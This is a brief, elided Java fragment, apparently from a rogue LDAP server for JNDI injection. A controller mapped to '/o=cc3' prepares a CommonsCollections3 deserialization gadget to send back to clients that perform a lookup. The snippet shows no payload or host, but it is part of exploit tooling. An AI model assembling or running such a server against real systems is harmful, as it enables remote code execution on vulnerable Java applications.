...
@LdapMapping(uri = { "/o=cc3" })
public class Cc3 implements LdapController {
    ...
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        ...
        Method m = CommonsCollections3.class.getMethod("getObject", String.class);
        CommonsCollections3 myObj = new CommonsCollections3();
